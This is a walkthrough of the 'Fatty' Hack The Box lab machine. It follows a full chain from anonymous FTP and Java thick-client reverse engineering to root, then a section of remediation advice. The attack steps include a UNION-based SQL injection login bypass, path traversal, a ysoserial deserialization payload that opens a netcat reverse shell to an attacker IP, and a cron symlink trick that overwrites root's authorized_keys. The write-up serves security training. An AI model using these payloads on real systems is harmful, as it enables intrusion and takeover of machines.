---
title: "Fatty HTB - Insane Linux Box Walkthrough"
date: 2025-09-22T08:00:00Z
tags: ["insane-linux", "java", "thick-client", "ftp", "sql-injection", "deserialization", "path-traversal", "reverse-engineering", "cron-exploitation", "symlink-attack", "privilege-escalation", "docker"]
difficulty: ["insane"]
categories: ["HTB", "Linux"]
draft: false
description: "Complete walkthrough of Fatty HTB machine featuring Java thick client exploitation, SQL injection privilege escalation, Java deserialization RCE, and cron job symlink attacks for root access"
---

# Fatty HTB - Insane Linux Box Walkthrough

{{< youtube 3bvKLj0akMM >}}

## Key Exploitation Steps and Techniques (Chronological Order)

Below is a chronological extraction of the key exploitation steps and techniques used in the provided data for the "Fatty" box from Hack The Box, as described in the video transcript. The steps focus on the process of exploiting the thick Java client and gaining root access to the target system.

---

### Key Exploitation Steps and Techniques (Chronological Order)

1. **Initial Reconnaissance with Nmap**
   - **Technique**: Port scanning using Nmap to identify open ports and services.
   - **Step**: Ran `nmap -sC -sV -oA nmap/fatty [TARGET-IP]` to enumerate services and versions, identifying:
     - **Port 21 (FTP)**: Anonymous FTP login allowed, containing `fatty-client.jar` and several note files (`note.txt`, `note2.txt`, `note3.txt`).
     - **Port 22 (SSH)**: Running on Debian.
     - **Port 1337**: Identified as a hidden port for the Java server (based on `note.txt`).
   - **Additional Scan**: Performed a full port scan (`sudo nmap -p- -oA nmap/fatty-all-ports [TARGET-IP]`) to confirm additional ports (1338, 1339) as mirrors.

2. **Downloading Files from FTP**
   - **Technique**: Recursive download using `wget` and manual FTP login to check for hidden files.
   - **Step**:
     - Used `wget -r ftp://[TARGET-IP]` to download all files from the FTP server, including `fatty-client.jar` and notes.
     - Logged into FTP with `ftp [TARGET-IP]` (anonymous login) and ran `dir -a` to confirm no hidden files were missed.
     - Analyzed notes:
       - **Note 1**: Mentioned the Java server port moved from 8000 to a hidden port (1337), with mirrors on 1338 and 1339.
       - **Note 2**: Indicated the client requires Java 8 and a specific resolution for tiling window managers.
       - **Note 3**: Provided credentials `qtc:clarabb` for the application.

3. **Running the Java Client**
   - **Technique**: Executing the Java thick client and troubleshooting version compatibility.
   - **Step**:
     - Attempted to run `java -jar fatty-client.jar` but encountered errors due to Java version mismatch (system was on Java 11).
     - Used Java 8 explicitly: `/usr/lib/jvm/java-8-openjdk/bin/java -jar fatty-client.jar`.
     - Tested login with `test:test`, but the application froze, indicating a connection issue.

4. **Network Traffic Analysis**
   - **Technique**: Packet capture with `tcpdump` and proxying with Burp Suite and `socat` to intercept traffic.
   - **Step**:
     - Ran `sudo tcpdump -i tun0` and later `sudo tcpdump -i any udp port 53` to identify DNS resolution attempts for `server.fatty.htb`.
     - Added `server.fatty.htb` to `/etc/hosts` pointing to `127.0.0.1` to intercept traffic locally.
     - Attempted to proxy traffic through Burp Suite (port 8000) but failed, likely due to non-HTTP traffic or certificate pinning.
     - Used `socat` to forward traffic: `socat TCP-LISTEN:8000,fork TCP:[TARGET-IP]:1337`.
     - Successfully logged in with `qtc:clarabb` credentials, confirming application functionality.

5. **Exploring the Java Client GUI**
   - **Technique**: Manual interaction with the client GUI to identify functionality and potential vulnerabilities.
   - **Step**:
     - Navigated the GUI, noting disabled features (e.g., server status) and accessible ones (e.g., file browser, configs).
     - Observed that the file browser accessed server-side files (e.g., `sshd_config`, `security.txt`), suggesting a potential Local File Inclusion (LFI) vulnerability.
     - Attempted to access restricted files (e.g., `/etc/passwd`) but was restricted by server-side filtering.

6. **Decompiling the Java Client**
   - **Technique**: Reverse engineering using CFR decompiler to analyze the `fatty-client.jar` source code.
   - **Step**:
     - Decompiled `fatty-client.jar` using `java -jar cfr.jar --outputpath ./client fatty-client.jar`.
     - Analyzed the decompiled code in Visual Studio Code, focusing on `ClientGUITest.java` to understand login and function invocation logic.
     - Identified that the client communicates with the server via a `Connection` class and invokes methods through an `Invoker` class.

7. **Creating a Custom Java Exploit Program**
   - **Technique**: Building a custom Java program to interact with the `fatty-client.jar` as a library for streamlined exploitation.
   - **Step**:
     - Set up a new Java project in Eclipse, importing `fatty-client.jar` as an external library.
     - Created `Exploit.java` to replicate login functionality:
       - Established a connection using `Connection.getConnection()`.
       - Created a `User` object with `qtc:clarabb` credentials and called `Connection.login()`.
       - Retrieved the user role (`Connection.getRoleName()`) and confirmed it as `user`.
     - Tested restricted commands (e.g., `Invoker.uname()`, `Invoker.ipconfig()`) but received "not allowed" errors due to server-side role-based access control.

8. **Exploiting LFI Vulnerability**
   - **Technique**: Path traversal to bypass server-side filtering and download server-side files.
   - **Step**:
     - Used the `Invoker.showFiles()` method to list files in the parent directory (`../`) and identified `fatty-server.jar` and `start.sh`.
     - Modified the exploit to call `Invoker.open("../", "start.sh")` to retrieve the `start.sh` script, revealing Docker usage and server startup details.
     - Attempted to retrieve `fatty-server.jar` using `Invoker.open("../", "fatty-server.jar")`, but the binary file was corrupted due to string-based handling.
     - Modified the `Invoker` class to create a `binaryOpen()` method that returns a byte array instead of a string.
     - Unsealed the `fatty-client.jar` by editing `META-INF/MANIFEST.MF` to remove the `Sealed: true` attribute and deleting signature files to allow custom class overriding.
     - Successfully downloaded `fatty-server.jar` using the modified `binaryOpen()` and wrote it to disk using `FileOutputStream`.

9. **Decompiling and Analyzing the Server Code**
   - **Technique**: Reverse engineering the server code to identify vulnerabilities.
   - **Step**:
     - Decompiled `fatty-server.jar` using `java -jar cfr.jar --outputpath ./server fatty-server.jar`.
     - Analyzed the server code, identifying:
       - A hardcoded MySQL password (`secure_database_powered_by_...`) for the `qtc` user.
       - A SQL query in `JavaDatabase.checkLogin()` vulnerable to SQL injection due to unsanitized user input.
       - A deserialization vulnerability in the `changePassword()` function, which accepts serialized user input and is restricted to admin roles.

10. **SQL Injection to Gain Admin Role**
    - **Technique**: SQL injection to bypass authentication and elevate privileges.
    - **Step**:
      - Modified the `User` object in `Exploit.java` to set `hashed=false`, ensuring the username is passed unhashed to the server.
      - Crafted a SQL injection payload: `qtc' UNION SELECT 1, 'pleasesubscribe', 'root@ipsec.rocks', 'ipsec', 'admin' --`.
      - Successfully logged in as an admin, confirmed by `Connection.getRoleName()` returning `admin`.
      - Tested admin privileges by running `Invoker.ipconfig()`, which now executed successfully.

11. **Java Deserialization Exploit**
    - **Technique**: Crafting a malicious serialized payload using `ysoserial` to achieve remote code execution.
    - **Step**:
      - Created a new `exploitChangePassword()` method in the `Invoker` class to send a custom payload to the `changePassword()` function.
      - Used `ysoserial` to generate a deserialization payload: `java -jar ysoserial.jar CommonsCollections5 "nc [ATTACKER-IP] 9001 -e /bin/sh" | base64 -w0`.
      - Sent the payload via `Invoker.exploitChangePassword()`, establishing a reverse shell to the attacker's machine (`nc -lvnp 9001`).
      - Confirmed the shell was running in a Docker container with limited tools (no `bash`, `python`, or `script`).

12. **Privilege Escalation via Cron Job**
    - **Technique**: Exploiting a cron job to overwrite the root SSH `authorized_keys` file.
    - **Step**:
      - Discovered a cron job (`logpolar.sh`) running every minute, using `scp` to copy `opt/fatty/logs.tar` to a remote server.
      - Used `pspy64` to monitor processes and confirm the cron job behavior.
      - Created a symbolic link exploit:
        - Created a directory `/dev/shm/exploit` and linked `logs.tar` to `/root/.ssh/authorized_keys` (`ln -s /root/.ssh/authorized_keys logs.tar`).
        - Created a tar archive containing the symbolic link: `tar cvf logs.tar -C exploit .`.
        - Copied the crafted `logs.tar` to `/opt/fatty/logs.tar`.
      - Generated an SSH key pair (`ssh-keygen -f qtc`) and appended the public key to `/root/.ssh/authorized_keys`.
      - Waited for the cron job to overwrite `authorized_keys` with the malicious `logs.tar`, allowing SSH access as root (`ssh -i qtc root@[TARGET-IP]`).
      - Accessed `root.txt` to complete the exploit.

---

### Summary of Key Techniques
- **Port Scanning and Service Enumeration**: Used Nmap to identify open ports and services (FTP, SSH, custom Java server ports).
- **File Retrieval via FTP**: Downloaded critical files (`fatty-client.jar`, notes) using anonymous FTP access.
- **Thick Client Reverse Engineering**: Decompiled and analyzed the Java client using CFR and Visual Studio Code.
- **Custom Exploit Development**: Built a Java program to interact with the client's library, enabling programmatic exploitation.
- **Local File Inclusion (LFI)**: Exploited path traversal to retrieve server-side files (`start.sh`, `fatty-server.jar`).
- **SQL Injection**: Bypassed authentication to gain admin privileges via a UNION-based SQL injection.
- **Java Deserialization**: Used `ysoserial` to craft a payload for remote code execution, gaining a reverse shell.
- **Cron Job Exploitation**: Manipulated a cron job to overwrite the root SSH `authorized_keys` file, achieving root access.

This sequence outlines the methodical approach to exploiting the "Fatty" box, leveraging multiple vulnerabilities in the Java thick client and server configuration.

## Security Gaps and Remediation

Below is a detailed list of the security gaps identified in the services and systems of the "Fatty" box from Hack The Box, as described in the provided transcript. Each gap is associated with a specific service or system, and I've included recommended fixes, categorized as either source code fixes or configuration fixes, to address these vulnerabilities.

---

### 1. FTP Service (Port 21)
**Gap**: Anonymous FTP login allowed, exposing sensitive files.
- **Description**: The FTP server permits anonymous logins, allowing anyone to download critical files such as `fatty-client.jar` and note files (`note.txt`, `note2.txt`, `note3.txt`) without authentication. This exposes application code and configuration details that facilitate further exploitation.
- **Fix**:
  - **Configuration Fix**:
    - Disable anonymous FTP access by modifying the FTP server configuration (e.g., for `vsftpd`, set `anonymous_enable=NO` in `/etc/vsftpd.conf`).
    - Restrict FTP access to authenticated users only, using strong credentials and limiting access to specific IP ranges or users.
    - Remove sensitive files (e.g., `fatty-client.jar`, notes) from the FTP server's public directory or place them in a restricted directory accessible only to authorized users.
  - **Source Code Fix**: Not applicable, as this is a configuration issue with the FTP server rather than application code.

---

### 2. Java Thick Client (fatty-client.jar)
**Gap**: Client-side role-based access control enforcement.
- **Description**: The Java client GUI disables certain features (e.g., server status) based on the user's role, but this enforcement is client-side. An attacker can modify the client code to enable restricted features, though server-side checks mitigated this in some cases.
- **Fix**:
  - **Source Code Fix**:
    - Move all role-based access control logic to the server side. For example, in `ClientGUITest.java`, remove client-side checks (e.g., `setEnabled(true)`) and ensure the server validates all requests against the user's role before execution.
    - Implement server-side validation for all menu item actions, ensuring that commands like `uname` or `ipconfig` are only executed if the server confirms the user has the required permissions.
  - **Configuration Fix**: Not applicable, as this requires changes to the application's logic rather than server configuration.

**Gap**: Hardcoded directory paths in file browser functionality.
- **Description**: The file browser functionality appends user input to a hardcoded directory path (e.g., `/opt/fatty/`), limiting the LFI exploit's scope. However, insufficient input validation allows path traversal (e.g., `../`) to access files outside the intended directory.
- **Fix**:
  - **Source Code Fix**:
    - In the `Invoker` class's `showFiles()` and `open()` methods, implement strict input validation to sanitize user-provided paths, rejecting any input containing `../` or absolute paths.
    - Use a whitelist approach to restrict file access to a predefined set of directories or files, ensuring users cannot navigate outside the intended scope.
    - Normalize file paths to resolve `../` before processing (e.g., using Java's `Path.normalize()`).
  - **Configuration Fix**: Not applicable, as this is a coding flaw rather than a configuration issue.

**Gap**: Lack of certificate pinning or proper TLS validation.
- **Description**: The client's SSL connection to the server could be intercepted using tools like `socat` or Burp Suite, indicating weak or absent certificate pinning. This allows man-in-the-middle (MITM) attacks to observe or manipulate traffic.
- **Fix**:
  - **Source Code Fix**:
    - Implement certificate pinning in the `Connection` class to validate the server's certificate against a known, trusted certificate or public key. Use Java's `SSLSocketFactory` with a custom `TrustManager` to enforce this.
    - Ensure the client rejects connections if the server's certificate does not match the expected fingerprint.
  - **Configuration Fix**:
    - Configure the server to use a valid, trusted SSL certificate issued by a recognized Certificate Authority (CA) instead of a self-signed certificate.
    - Enable strict TLS settings on the server (e.g., disable weak ciphers and enforce TLS 1.2 or higher).

---

### 3. Java Server (fatty-server.jar)
**Gap**: SQL injection vulnerability in login functionality.
- **Description**: The `JavaDatabase.checkLogin()` method constructs a SQL query using unsanitized user input (`user.getUsername()`), allowing SQL injection (e.g., `qtc' UNION SELECT 1, 'pleasesubscribe', 'root@ipsec.rocks', 'ipsec', 'admin' --`). This enables privilege escalation to an admin role.
- **Fix**:
  - **Source Code Fix**:
    - Use prepared statements with parameterized queries to prevent SQL injection. For example, rewrite the query in `checkLogin()` as:
      ```java
      PreparedStatement stmt = conn.prepareStatement("SELECT * FROM users WHERE username = ?");
      stmt.setString(1, username);
      ResultSet rs = stmt.executeQuery();
      ```
    - Validate and sanitize all user inputs before passing them to the database.
  - **Configuration Fix**:
    - Restrict database permissions to limit the impact of SQL injection (e.g., grant the application user only `SELECT` permissions on the `users` table).
    - Enable query logging and monitoring to detect and alert on suspicious SQL queries.

**Gap**: Java deserialization vulnerability in `changePassword()` function.
- **Description**: The `changePassword()` function deserializes user-supplied input, allowing attackers to send malicious serialized objects (e.g., via `ysoserial` with CommonsCollections5) to execute arbitrary code, leading to a reverse shell.
- **Fix**:
  - **Source Code Fix**:
    - Avoid deserialization of user-controlled input entirely. If serialization is necessary, use a safe serialization framework (e.g., JSON with strict schema validation) instead of Java's `ObjectInputStream`.
    - Implement a whitelist of allowed classes for deserialization using a custom `ObjectInputFilter` (Java 9+) or a library like `SerialKiller` to block untrusted classes (e.g., `org.apache.commons.collections`).
    - If `changePassword()` requires serialized data, validate the input structure and restrict it to expected fields (e.g., username, password) before deserialization.
  - **Configuration Fix**:
    - Disable unnecessary Java libraries (e.g., Apache Commons Collections) on the server to reduce the attack surface for deserialization exploits.
    - Run the server with a security manager to restrict dangerous operations during deserialization.

**Gap**: Inadequate path traversal sanitization in file operations.
- **Description**: The server's file operation logic (e.g., `open()` and `showFiles()`) attempts to prevent path traversal by replacing `../` but fails to handle cases like `../` without a trailing slash, allowing attackers to access files outside the intended directory (e.g., `fatty-server.jar`).
- **Fix**:
  - **Source Code Fix**:
    - Strengthen path sanitization in the server's file handling logic (e.g., in `Handler` or related classes) by using Java's `Path.normalize()` and `Path.toRealPath()` to resolve paths and reject any that escape the intended directory.
    - Implement a whitelist of allowed directories (e.g., `/opt/fatty/config`) and reject requests for files outside these paths.
    - Log and reject requests containing suspicious patterns (e.g., multiple `../` sequences).
  - **Configuration Fix**:
    - Run the server process with restricted file system permissions (e.g., using a non-root user with access only to `/opt/fatty`).
    - Use a chroot jail or container isolation to limit the server's file system access.

**Gap**: Hardcoded database credentials.
- **Description**: The server code contains a hardcoded MySQL password (`secure_database_powered_by_...`) for the `qtc` user, which can be extracted by decompiling `fatty-server.jar`.
- **Fix**:
  - **Source Code Fix**:
    - Remove hardcoded credentials from the source code. Instead, use environment variables or a secure configuration file (e.g., encrypted properties file) to store database credentials.
    - Example: Use `System.getenv("DB_PASSWORD")` to retrieve the password from an environment variable.
  - **Configuration Fix**:
    - Store credentials in a secure vault (e.g., HashiCorp Vault) or a configuration file with restricted permissions (e.g., `chmod 600 /opt/fatty/db.conf`).
    - Restrict database access to the minimum necessary permissions and use a unique, strong password for the `qtc` user.

---

### 4. SSH Service (Port 22)
**Gap**: Public key authentication only, with no password fallback.
- **Description**: The SSH server only allows public key authentication, but the `authorized_keys` file is writable due to a cron job exploit, allowing attackers to insert their own keys.
- **Fix**:
  - **Configuration Fix**:
    - Restrict write access to `/root/.ssh/authorized_keys` (e.g., `chmod 600 /root/.ssh/authorized_keys` and ensure the directory is owned by `root` with `chmod 700 /root/.ssh`).
    - Disable root login in the SSH configuration (`PermitRootLogin no` in `/etc/ssh/sshd_config`).
    - Implement IP-based access controls (e.g., using `iptables` or `AllowUsers` in `sshd_config`) to limit SSH access to trusted IPs.
  - **Source Code Fix**: Not applicable, as this is a configuration issue with the SSH service.

---

### 5. Cron Job (logpolar.sh)
**Gap**: Cron job overwrites files without validation, enabling symbolic link attacks.
- **Description**: The `logpolar.sh` cron job runs as root every minute, copying `/opt/fatty/logs.tar` to a remote server via `scp`. Attackers can create a symbolic link from `logs.tar` to `/root/.ssh/authorized_keys`, causing the cron job to overwrite the `authorized_keys` file with attacker-controlled content.
- **Fix**:
  - **Source Code Fix**:
    - Modify the cron job script to validate the contents of `logs.tar` before copying. For example, use `tar -tvf logs.tar` to check for symbolic links and reject archives containing them.
    - Implement file integrity checks (e.g., checksums) to ensure `logs.tar` is not tampered with before processing.
  - **Configuration Fix**:
    - Run the cron job as a non-root user with restricted permissions to prevent overwriting sensitive files like `/root/.ssh/authorized_keys`.
    - Use a dedicated directory for cron job outputs (e.g., `/var/log/fatty`) with strict permissions (`chmod 700`, owned by a non-root user).
    - Disable `scp` in the cron job and use a more secure file transfer mechanism (e.g., `rsync` with `--no-links` to reject symbolic links).
    - Implement a file system monitoring tool (e.g., `auditd`) to detect and alert on unauthorized changes to sensitive files.

**Gap**: Cron job runs in an insecure environment.
- **Description**: The cron job operates in a Docker container with excessive permissions, allowing attackers to manipulate files in `/opt/fatty` and execute commands as root.
- **Fix**:
  - **Configuration Fix**:
    - Run the Docker container with a non-root user and use Docker's user namespace feature to map container root to a non-privileged host user.
    - Apply the principle of least privilege by mounting only the necessary directories (e.g., `/opt/fatty/logs`) with read-only access where possible.
    - Use Docker's `--cap-drop` option to remove unnecessary capabilities (e.g., `CAP_DAC_OVERRIDE`) that allow file permission changes.
    - Restrict cron job access to specific files using AppArmor or SELinux profiles to prevent unauthorized file operations.
  - **Source Code Fix**: Not applicable, as this is a configuration issue with the cron job and Docker environment.

---

### 6. Docker Container
**Gap**: Overly permissive container environment.
- **Description**: The Docker container hosting the Java server and cron job allows execution of sensitive operations (e.g., file creation in `/opt/fatty`, symbolic link creation) and includes tools like `wget` and `tar`, which facilitate exploitation.
- **Fix**:
  - **Configuration Fix**:
    - Use a minimal base image (e.g., `alpine`) for the Docker container to reduce the attack surface by excluding unnecessary tools (e.g., `wget`, `tar`).
    - Implement a read-only file system for the container (`docker run --read-only`) except for specific directories requiring write access (e.g., `/opt/fatty/logs` with a tmpfs mount).
    - Drop all unnecessary Linux capabilities (e.g., `docker run --cap-drop all --cap-add NET_BIND_SERVICE`) to limit the container's ability to perform privileged operations.
    - Use Docker's seccomp profile to restrict syscalls (e.g., block `symlink` or `chown`).
  - **Source Code Fix**: Not applicable, as this is a configuration issue with the Docker setup.

**Gap**: Lack of network isolation.
- **Description**: The container allows outbound connections (e.g., `nc` reverse shell to attacker's machine) and exposes sensitive ports (e.g., 1337) to the external network.
- **Fix**:
  - **Configuration Fix**:
    - Configure Docker's network to use a private network namespace, restricting outbound connections to only necessary services (e.g., MySQL database).
    - Use a firewall (e.g., `iptables` or Docker's `--network` options) to block outbound connections except to whitelisted IPs/ports.
    - Expose only necessary ports (e.g., 1337) internally within the Docker network and use a reverse proxy with strict access controls for external access.
  - **Source Code Fix**: Not applicable, as this is a configuration issue with the Docker network.

---

### Summary Table of Gaps and Fixes

| **Service/System** | **Gap** | **Fix Type** | **Recommended Fix** |
|--------------------|---------|--------------|---------------------|
| **FTP (Port 21)** | Anonymous login allowed | Configuration | Disable anonymous access, restrict to authenticated users, remove sensitive files. |
| **Java Client** | Client-side access control | Source Code | Move role checks to server side, validate requests server-side. |
| **Java Client** | Hardcoded paths with weak LFI protection | Source Code | Sanitize paths, use whitelist for directories, normalize paths. |
| **Java Client** | Weak TLS validation | Source Code / Configuration | Implement certificate pinning, use trusted SSL certificates. |
| **Java Server** | SQL injection in login | Source Code / Configuration | Use prepared statements, restrict database permissions. |
| **Java Server** | Deserialization vulnerability | Source Code / Configuration | Avoid user-controlled deserialization, whitelist classes, disable unnecessary libraries. |
| **Java Server** | Weak path traversal sanitization | Source Code / Configuration | Strengthen path sanitization, restrict file system access, use chroot or container isolation. |
| **Java Server** | Hardcoded credentials | Source Code / Configuration | Use environment variables or secure vault, restrict file permissions. |
| **SSH (Port 22)** | Writable `authorized_keys` | Configuration | Restrict file permissions, disable root login, limit SSH access by IP. |
| **Cron Job** | File overwrite via symbolic links | Source Code / Configuration | Validate tar contents, run as non-root, restrict file system access. |
| **Cron Job** | Insecure environment | Configuration | Use non-root user, restrict permissions, monitor file changes. |
| **Docker Container** | Overly permissive environment | Configuration | Use minimal image, read-only file system, drop capabilities, use seccomp. |
| **Docker Container** | Lack of network isolation | Configuration | Use private network, restrict outbound connections, limit exposed ports. |

---

These fixes address the vulnerabilities exploited in the "Fatty" box, ensuring the services and systems are hardened against similar attacks. Implementing a combination of source code improvements and configuration changes will significantly enhance the security posture of the system.

## Conclusion

Fatty is an excellent machine that demonstrates the complexity of modern thick client applications and the interconnected nature of system vulnerabilities. It requires expertise in:
- Java thick client reverse engineering and modification
- SQL injection techniques and privilege escalation
- Java deserialization vulnerabilities and exploitation
- Path traversal and local file inclusion attacks
- Cron job manipulation and symlink attacks
- Docker container security and privilege escalation

The machine emphasizes the importance of proper input validation, secure coding practices, server-side security controls, and the principle of least privilege in both application design and system administration.

---

*This walkthrough covers the complete exploitation chain for educational purposes in authorized testing environments only.*